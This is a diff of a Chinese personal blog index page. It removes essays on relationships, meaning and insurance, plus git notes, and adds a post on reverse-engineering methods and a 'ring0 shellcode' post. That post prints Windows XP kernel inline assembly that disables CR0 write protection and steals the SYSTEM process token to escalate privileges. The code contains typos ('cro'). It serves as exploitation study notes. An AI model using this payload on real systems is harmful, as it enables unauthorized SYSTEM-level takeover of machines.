-<p>1.所有的付出，有声无声，本质都是一种对未来的预期。<br>2.有一方为了另外一方付出太多的时候，都会在极为长的时间内积蓄，然后在某一天爆发，所有的付出，哪怕是当初毫无怨言的付出，都会在未来有一天吵架的时候，成为攻击的理由，付出越大，攻击性越强。<br>3.一个人越说，不要什么，其实要的就更多。<br>4.所有感动带来的婚姻都不太会幸福，因为带了太多的付出感在里面。<br>5.很多感情用钱来衡量一定是侮辱自己，也侮辱别人。</p>
-<blockquote>
-<p>想象</p>
-</blockquote>
-<p>&emsp;&emsp;发现自己一直以来都没有正视过，付出就是想要得到回报这句话。<br>&emsp;&emsp;作为人每时没刻的行为都是在付出某种行动，来获取某种回报。在烦恼的时候，看视频看笑话，是为了获取忘记烦恼的时刻。在工作上，付出劳动力，是为了获取劳动价值，获取自身价值的体现，获取意义感的满足。在感情上，付出自己的时间陪伴是为了获取一个能够相互依赖的伴侣或者友谊等等。付出总是有某种目的在里面，不论目的是为了获取短暂的快乐或者某种情绪，还是为了更长远的收获。<br>&emsp;&emsp;所以当一个人付出了对于他<strong>很重要的代价</strong>的时候，却不需要你回报什么的时候，这说明他想要的可能越多，隐藏了自己的预期。但是这也说明了，在生活或者工作中，当他人对你付出了，如果认可了，那给予对等的回报或许是一个情商高的表现。<br>&emsp;&emsp;回到校长回答的问题本身。感情的付出，很多时候都是一方在主动付出，一方在被动接受。看了一些评论，有的人认为，是因为你付出太多，期望太多，少点付出，少点期待。有的人认为，有的是因为你付出的努力并没有让对方感觉到你在付出，付出的方式有问题。有的人认为是因为付出前就没有判断出付出本是无用功。在这么多的评价当中就能发现人与人的看法便就各有不同。结合这些观点，在付出之前就应该掂量自己的本事，你能付出什么，想要获得什么。如果付出了，怎么让对方感受到你的付出。付出了却得不到自己想要的回报时要怎么办。然而我已经无法回答这些问题。留着等以后再回来回答。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/07/12/付出与收获/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-无助的我" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/07/06/无助的我/">确实有点无助</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/07/06/无助的我/" class="archive-article-date">
-  	<time datetime="2018-07-06T12:46:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-06</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p> 今天才确实发现自己挺无助的。<br> 我现在所做建立在没有任何风险的产生，当有任何一项风险的产生。我发现我没有任何的一种能想到能力能让我想起来能对抗风险。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/07/06/无助的我/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-空虚感和意义感" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/06/28/空虚感和意义感/">空虚感和意义感</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/06/28/空虚感和意义感/" class="archive-article-date">
-  	<time datetime="2018-06-28T02:57:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-28</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>  读文章<a href="https://www.zhihu.com/question/19980610/answer/26205500" target="_blank" rel="noopener">https://www.zhihu.com/question/19980610/answer/26205500</a>后感</p>
-<p>  意义感的本质是，我们感觉自己和未来，和他人，和更大世界有联系。我们是属于一个宏大而有序的整体的一部分。<br>  比如一个单块的拼板，不知道它用来做什么，放在什么位置上就会随意处置或者丢弃它。而如果我们这样随意处置时间，生命和我们自己，就会产生空虚感。</p>
-<blockquote>
-<p>意义与目标</p>
-</blockquote>
-<p> 当知道自己要在人生的这一时刻要干什么，就会感到有意义。但是当受限于能力无法完成想象中的人生图景时，我们便会感到空虚。目标让实现它的过程有意义。</p>
-<blockquote>
-<p>意义与人际关系</p>
-</blockquote>
-<p> 当我们感觉到空虚的时候，不会出现和亲密的家人，朋友相处的时间里。我们需要和被需要，爱与被爱，愿意彼此付出。在这个过程中，我们重要而又关键所以珍惜彼此，所以我们就会有意义感。<br> 所以如果生活是孤立的，没有人在乎，不知道是否真的爱着谁又被谁爱着，就会空虚。</p>
-<blockquote>
-<p>目标与坚持</p>
-</blockquote>
-<p> 刚开始决定一个目标的时候，有时候出自于强烈的兴趣，有时候只是想要尝试看看。但是这过程中都需要坚持。我认为坚持不是闷头苦干，坚持需要有正反馈，不管这种反馈是来自于他人，还是来自于自己。一直关注scalers的公众号，他提供了一个环境，一群人一起坚持做某件事，通过互相鼓励，互相之间得到正反馈来完成坚持的目标。如果没有一个环境让你去坚持目标，那分享出自己的坚持，把自己的坚持记录下来并分享到自己的博客或许也是一个不错的选择。</p>
-<blockquote>
-<p>目标与疲惫感</p>
-</blockquote>
-<p> 我认为疲惫感有几种。</p>
-<ol>
-<li>由于在完成目标或者与人交际过程中受到了不可攀越的阻力，当自己的能力无法实现自己所幻想的蓝图时，就会产生很强烈的疲惫感。</li>
-<li>人生需要正反馈，一个大目标持续的时间可能是人生的一段时间。但是记忆一直在受到时间空间各种方面的侵蚀，如果正反馈在记忆中维持感觉，便会忘记当初的所谓的目标与意义感。感觉越来越弱，没有坚持的意义，自然感觉到了疲惫感。</li>
-<li>纯粹就是累了，闷头一觉便是。</li>
+        <ol>
+<li>自上而下的分析<br>从程序入口点开始分析,模拟程序运行的整个流程,对程序进行分析</li>
+<li>自下而上分析<br>找到关键API,栈回溯分析,比如程序弹出MessageBoxA/W，从弹框栈回溯分析找到窗口回调函数,从窗口回调函数开始分析</li>
+<li>字符串分析<br>根据弹窗提示的字符串,再调试器中查找,定位关键代码,再分析<br>根据调试时查看到的第三方库的版本号<br>比如:加密通讯库openssl  嵌入式脚本lua</li>
+<li>源码对比分析<br>分析源码特征,然后去调试分析<br>5.假设某一个函数的内部复杂,可以在成功调用函数的代码处,不停调用目标函数,构造类似参数,从返回值,传出参数来判断函数的功能。</li>
 </ol>
+<p>分析心态:分析过程中不停猜测程序的意图和流程</p>
 
       
 
@@ -734,7 +898,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
         		</li>
       		
 		</ul>
@@ -744,7 +908,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/06/28/空虚感和意义感/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/逆向分析方法/">展开全文 >></a>
         </p>
       
 
@@ -778,21 +942,21 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-保险细则" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-内核shellcode" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/06/26/保险细则/">购买保险笔记</a>
+      <a class="article-title" href="/2018/08/20/内核shellcode/">ring0 shellcode</a>
     </h1>
   
 
 		
         
-        <a href="/2018/06/26/保险细则/" class="archive-article-date">
-  	<time datetime="2018-06-26T03:08:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-26</time>
+        <a href="/2018/08/20/内核shellcode/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
       </header>
@@ -800,68 +964,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>看了聚秀君的买保险的几个文章做个总结和记录，想自己看文章的关注扯淡堂</p>
-<blockquote>
-<p>买保险前5原则</p>
+        <blockquote>
+<p>提权到SYSTEM 修改当前进程的token为SYSTEM进程的token</p>
 </blockquote>
-<ul>
-<li>先人身，后财产</li>
-<li>先大人，后小孩</li>
-<li>先规划，后产品<br>&emsp;&emsp;根据个人和家庭基本情况，进行多方权衡，制定完整的保险购买计划，之后根据自己的人生进度不断进行调整。</li>
-<li>先保障，后理财<br>&emsp;&emsp;买保险就是为了防止出现家庭无法承担的情况，所以不要买保险还有理财功能的产品。<br>&emsp;&emsp;<strong>将家庭财富分为4个账户:要花的钱，保命的钱，进行投资的钱，保本升值的钱。</strong></li>
-<li>先保额，后保费<br>&emsp;&emsp;重疾险，保额应为年收入的3-5倍。保险产品的保障范围以及保障程度。<br>&emsp;&emsp;根据年龄段，薪水，人生阶段买不同保险。例如在刚毕业时候，先买消费性，一年可能只要几百块，等预算充足，然后补充长期或者终身型重疾险。</li>
-</ul>
-<blockquote>
-<p>刚需保险</p>
-</blockquote>
-<ul>
-<li>意外险<br>&emsp;&emsp;意外险容易买，保费便宜，保障高。意外险对被保人的职业有要求。例如警察运动员等会拒保。确定职业是否在可保范围。<br>&emsp;&emsp;<strong>线上买比线下买便宜，线下买对健康有要求，需问清楚。<br>意外险通常是短期险，保1年，一但保单失效，要及时补充。</strong></li>
-<li>重疾险<br>&emsp;&emsp;一般重疾险包含以下25类<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6种必保疾病：恶性肿瘤（不包括部分早期恶性肿瘤）、急性心肌梗塞、脑中风后遗症、重大器官移植术或造血干细胞移植术、冠状动脉搭桥术、终末期肾病。</span><br><span class="line">19种可选疾病：多个肢体缺失、急性或亚急性重症肝炎、良性脑肿瘤、慢性肝功能衰竭失代偿期、脑炎后遗症或脑膜炎后遗症、深度昏迷、双耳失聪、双目失明、瘫痪、心脏瓣膜手术、急性或亚急性重症肝炎、严重阿尔茨海默病严重脑损伤严重帕金森病、严重Ⅲ度烧伤、严重原发性肺动脉高压、严重运动神经元病、语言能力丧失、重型再生障碍性贫血、主动脉手术。</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>&emsp;&emsp;<strong>重疾险，确诊后就赔付保额。</strong><br>&emsp;&emsp;<strong>重疾险，不仅仅用来补偿医疗费用，还要补偿患病后的家庭经济损失。</strong><br>&emsp;&emsp;<strong>重疾险可以重复购买，在不同公司购买重疾险</strong></p>
-<ul>
-<li>医疗险<br>&emsp;&emsp;分3类:低保额，低免赔的医疗险；高保额，高免赔的医疗险，高端医疗险。<br>&emsp;&emsp;免赔即为高过多少才会赔偿。第一种，只要住院就能报销，但是一般保额在1~5w之间。第二种存在1w元免赔，但是保额高。高端医疗险，保障巨额医药费，保费很贵。<br>&emsp;&emsp;<strong>医疗险不要重复买</strong><br>&emsp;&emsp;<strong>重疾险转移大病风险，医疗险转移看病风险，大病小病都管。社保只能保目录内用药。然后理赔时，3者不冲突。</strong></li>
-<li>寿险<br>&emsp;&emsp;身故就赔的保险。分定期寿险和终身寿险。定期寿险保到一定岁数。终身寿险必定会赔付，但保费比定期寿险高，兼财富传承作用。承担家庭责任的人，建议购买。<br>&emsp;&emsp;<strong>意外险只保意外，不保非意外。寿险保意外身故和疾病身故。意外险保残疾，寿险不保。</strong></li>
-</ul>
-<blockquote>
-<p>购买保险的人生阶段</p>
-</blockquote>
-<ul>
-<li><p>少年阶段(0-18)<br>&emsp;&emsp;大人买了保险的情况下，如果还有闲钱，为小孩买保险。<br>&emsp;&emsp;<strong>医保，意外险，重疾险。经济宽裕，再适当购买医疗险。</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">医保:是基础性保障，必须参加。</span><br><span class="line">意外险:由于小孩好动，属于刚需保险，市面的少儿意外险很多，多以1年期形式出现。费用不高，一般一二百，保额也偏低。家长可以多买几份外医疗保障教好的。</span><br><span class="line">消费型重疾险:由于保险更新换代快以及通货膨胀，为孩子购买20或30年的消费性重疾险。孩子成年之后再酌情补充终身型重疾险。注意是否覆盖少儿特有重疾，如川崎病，重症手足口病。最好还有“豁免”条款，即得了合约中约定的病后，可以不用再交保费。</span><br><span class="line">医疗险，经济条件允许，建议选择高保额，高免赔额。</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>进入社会(20-30)<br>&emsp;&emsp;人生重要过渡期。配置消费性产品。<br>&emsp;&emsp;<strong>意外险，消费型重疾险，定期寿险。</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">消费型重疾险:保费几百的重疾险，医保/新农合，政府与保险公司合作推出的重疾补充保险会是更好的选择，具体向当地社保局了解。经济宽裕，强烈建议买长期重疾险，由于身体比较健康，有一些性价比比较高的产品。</span><br><span class="line">定期寿险:保费低，杠杆率高。</span><br><span class="line">不建议理财险，对于年轻人自我投资学习，买房相对迫切。</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>成家(30-40)<br>&emsp;&emsp;<strong>意外险，重疾险，定期寿险，医疗险</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">该阶段，一般事业小成，有一定积蓄，家有老小，房贷，车贷等。工作压力，年龄等，身体下坡。</span><br><span class="line">意外险必配:买的保额不能低。</span><br><span class="line">重要疾病险:优先考虑终身型疾病险，健康情况还好，保费不会太高。如果预算有限，考虑终身型和消费型组合搭配。</span><br><span class="line">定期寿险:强烈建议买。</span><br><span class="line">医疗险:经济允许下，建议选择高保额，高免赔额。</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>事业高峰(40-50)<br>&emsp;&emsp;<strong>高保额意外险，重疾险，定期寿险，医疗险，养老保险</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">高保额意外险:刚需，优选高保额。比如100w，意外险保费不高。不妨多买几份。最好选择意外身故/伤残比较高的，但是意外险短期较多，及时续保。</span><br><span class="line">重疾险:建议终身重疾险，而且要尽早。重疾险随着年龄增长而逐渐增高，身体不好甚至买不了。该阶段是能买到重疾险的最后机会。</span><br><span class="line">定期寿险:定期寿险优先，纯保障作用。如已购买，考虑到现家庭支出，保额不够的话，不妨加保额。</span><br><span class="line">医疗险:该阶段，医疗险是刚需，建议入手性价比不错的百万医疗险。</span><br><span class="line">养老保险:尽早规划养老问题。晚年压力才会更小。</span><br><span class="line">建议适当补充商业养老保险，保额定的稍高，选择最长缴费期，降低保费压力，确保退休后的生活质量，求医看病不受影响。</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>晚年期(50之后)<br>&emsp;&emsp;<strong>意外险，重疾险，医疗险</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">意外险:发生意外概率高，配置意外险尤其重要。对年龄要求不高，70,80也可以正常买，但是保额不高</span><br><span class="line">重病险:此年龄段，买重疾险不划算，选择不错的防癌险。保费2000，保到70或80,10w保额也推荐购买。应该趁年轻时配置好重疾险。</span><br><span class="line">医疗险:百万医疗险也差不多2000不到，也可对防癌险起到较好的补充作用。</span><br><span class="line">年老应该做定期体检。</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<blockquote>
-<p>投保前到拿到保单后，需要注意的细节</p>
-</blockquote>
-<p>一,投保前:1.承保公司；2.保险代理；3.保险特性；4.投保渠道<br>二,投保中:1.个人信息；2.投保内容；3.保障内容<br>三,投保后:1.保单真实性；2.保单内容；3.犹豫期退保；4.观察期</p>
-<ul>
-<li><p>投保前<br>1.核实保险公司是否正规。回拨确认或者拨打保险公司固定投保电话确认。其他保险:登陆保险会官网查询保险机构，或通过保险公司网站，app,官方微信了解情况。<br>2.核实代理人身份。核实真是身份，要求出示有效工作证件，身份证，代理期限，再打电话到保险公司询问。<br>3.核实险种特性。例如意外险有意外伤害险和意外医疗险2种。前者保障责任主要是意外身故和意外伤残，后者保障因意外事故产生对的门诊，急诊，住院医疗费用。有些产品只保意外全残，而不是意外伤残，不划算。医疗险一般是报销型医疗险，扣除免赔款和医疗保险部分后，剩下的部分。<br>4.投保渠道。国内投保6大渠道:保险代理人，银行保险，团体保险，经纪代理，电话销售及互联网保险。<br>同一产品，线上便宜些。<strong>短期医疗险，意外险，符合健康告知，可直接线上购买;长期险种，则建议线下咨询后购买。</strong></p>
-</li>
-<li><p>投保中<br>1.如实填报个人信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">个人信息:受益人可指定，不指定，默认为法定受益人。</span><br><span class="line">签名栏:保险人亲笔签署(少儿险除外)</span><br><span class="line">信息变更:有变更(含地址，受益人等),及时联系保险公司。</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>2.投保内容：险种，金额，期限<br> 保险行业竞争激烈，为适应不同投保人需求，不同保险公司会设计不同产品，及时同一家保险公司的同一款产品，也有多个保障档次，提供投保选择，或者不断升级完善。<br> 投保时，特别留意险种名称，保额，保费，期限等关键内容。<br>3.保障责任<br> 投保人应对保单条款了解不能盲目投保，例如意外险不保自身脑出血引发的意外身故。</p>
-<ul>
-<li>投保后<br>投保后，及时向保险公司索取保单或者相关凭证。<strong>并仔细审核保单和投保单内容是否一致。</strong><br>1.审核保单真实性<br>购买产品2天后，通过保险公司网站自助查询保单信息。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">保单上是否有&quot;中国保险监督管理委员会监制&quot;字样。</span><br><span class="line">保险公司合同专用章和所在保险公司经理签字或盖章是否清晰。</span><br><span class="line">是否有该保险公司客户服务电话及保单查询方式。</span><br><span class="line">保单生效时间，真保单应精确到起止的年月日时分。</span><br><span class="line">假保单的保单号，发票后为后期机打，非与保单同时印刷而成。</span><br><span class="line">网上购买或激活的保单，会受到短信或邮件承包通知，以及电子保单，而不是销售网站的通知。虚登陆保险公司官网，根据保单号核查保单真实性。</span><br><span class="line">如还有疑问，拨打保险公司电话查询。</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>2.保单与投保内容一致<br>重点检查保单号，险种名称，投保人，被保险人，受益人，生效时间，保险金额及期限，保障内容等。如不一致，及时联络保险公司更改。<br>3.犹豫期退保<br>  犹豫期内退，最多收取10元成本费，如果犹豫期后，扣除较多手续费。<br>4.等待期<br>  承包健康险(意外险除外)有观察期，一般为90或180天，期间出险，保险公司不赔付。</p>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">DWORD g_uCro;</span><br><span class="line">DWORD g_isRing0ShellCodeCalled = 0;</span><br><span class="line">NTSTATUS MyshellCode() &#123;</span><br><span class="line">	//关闭内核写保护</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		cli</span><br><span class="line">		mov eax,cr0</span><br><span class="line">		mov g_uCro,eax</span><br><span class="line">		and eax,0xFFFEFFFF</span><br><span class="line">		mov cro,eax</span><br><span class="line">	&#125;</span><br><span class="line">	//提权到system</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax,0xFFDFF124 //eax = KPCR(not 3G Mode)</span><br><span class="line">		mov eax,[eax]      //获取当前线程PETHREAD</span><br><span class="line">		mov esi,[eax+0x220] //获取当前进程所属进程的PEROCESS</span><br><span class="line">		mov eax,esi</span><br><span class="line">		searchXp:</span><br><span class="line">			mov eax,[eax+0x88]</span><br><span class="line">			sub eax,0x88 //获取进程链表下一个进程的PEPROCESS</span><br><span class="line">			mov edx,[eax+0x84] //获取进程的PID到edx</span><br><span class="line">			cmp edx,0x4 //通过PID查找SYSTEM进程</span><br><span class="line">			jne searchXp</span><br><span class="line">			mov eax,[eax+0xc8] //获取system进程的token</span><br><span class="line">			mov [esi+0xc8],eax //修改当前进程的token</span><br><span class="line">	&#125;</span><br><span class="line">	//恢复内核写保护</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		sti</span><br><span class="line">		mov eax,g_uCro</span><br><span class="line">		mov cro,eax</span><br><span class="line">	&#125;</span><br><span class="line">	g_isRing0ShellCodeCalled = 1;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
       
 
       
@@ -874,96 +980,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
         		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/06/26/保险细则/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-随想随记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/06/26/随想随记/">随想随记</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/06/26/随想随记/" class="archive-article-date">
-  	<time datetime="2018-06-26T03:08:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-26</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>思考并不等于理智。认知和经验产生了直觉，理智获取这些直觉来做出判断，假如认可就形成行为。如果不认可就会通过自控来约束自己的直觉。<br>我认为理智不起作用的几种情况:</p>
-<blockquote>
-<p>1.认知缺陷</p>
-</blockquote>
-<p>  认知缺陷我认为通俗易懂的话来说就是智商税，在见识的巨大差距下，有限的知识在直觉的联想启发和天生的因果推理关系下形成错误的判断。</p>
-<blockquote>
-<p>2.自我损耗</p>
-</blockquote>
-<p>  当你必须要去完成一些认知活动时，又出现了一些额外的事情需要去处理的时候，就会出现自我损耗。自我损耗会导致自控力下降并且容易产生自私的情绪。即为心烦意乱，所以最好不要在别人进行忙的时候打扰到别人，就算是你认为亲近的人。因为这样可能会导致矛盾的产生。</p>
-<p>  一件事情的发生，事实本身已经无法改变，因为即使重来一次，你还是会做出这样的决定。这些事情的产生往往来至于知识经验等各方面的不足。当事情发生后，后悔并不能解决任何问题，从中知道自己的不足之处然后改正过来便是难以做到的事情了。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
+      		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随记</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Window内核漏洞利用</a>
         		</li>
       		
 		</ul>
@@ -973,88 +994,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/06/26/随想随记/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-git" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/06/26/git/">git使用</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/06/26/git/" class="archive-article-date">
-  	<time datetime="2018-06-26T03:08:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-26</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="第一次使用git配置github"><a href="#第一次使用git配置github" class="headerlink" title="第一次使用git配置github"></a>第一次使用git配置github</h3><p>配置ssh key<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ras -C &quot;邮件地址&quot;</span><br><span class="line">找到.ssh\id_rsa.pub文件，再github中个人设置中添加 sshkey</span><br><span class="line">ssh -T git@github.com # 注意邮箱地址不用改</span><br><span class="line">配置成功出现:Hi xxx! You&apos;ve successfully authenticated, but GitHub does not provide shell access. </span><br><span class="line"></span><br><span class="line">然后:</span><br><span class="line">git config --global user.name &quot;xxx&quot;// 你的github用户名，非昵称</span><br><span class="line">git config --global user.email  &quot;xxx@qq.com&quot;// 填写你的github注册邮箱</span><br></pre></td></tr></table></figure></p>
-<p>一直需要输入用户名密码执行一下命令<br>git config –global credential.helper store</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">git</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/06/26/git/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/内核shellcode/">展开全文 >></a>
         </p>
       
 
@@ -1090,7 +1030,7 @@
   
   
     <nav id="page-nav">
